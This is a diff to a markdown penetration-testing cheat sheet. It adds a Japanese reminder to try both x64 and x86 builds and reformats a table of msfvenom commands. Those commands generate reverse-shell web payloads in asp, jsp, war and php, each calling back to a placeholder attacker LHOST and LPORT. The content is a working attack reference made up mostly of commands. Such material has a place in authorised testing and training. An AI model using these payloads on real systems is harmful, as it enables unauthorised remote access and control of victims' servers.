@@ -1,6 +1,7 @@
 ## Non-Meterpreter Binaries
 
 Staged Payloads for Windows
+※ x64とx86はどちらも試すこと
 
 |     |                                                                                            |
 | --- | ------------------------------------------------------------------------------------------ |
@@ -32,12 +33,12 @@ Stageless Payloads for Linux
 
 ## Non-Meterpreter Web Payloads
 
-|   |   |
-|---|---|
-|asp|`msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp`|
-|jsp|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp`|
-|war|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war`|
-|php|`msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php`|
+|     |                                                                                     |
+| --- | ----------------------------------------------------------------------------------- |
+| asp | `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp`  |
+| jsp | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp` |
+| war | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war` |
+| php | `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php`            |
 
 ---
 
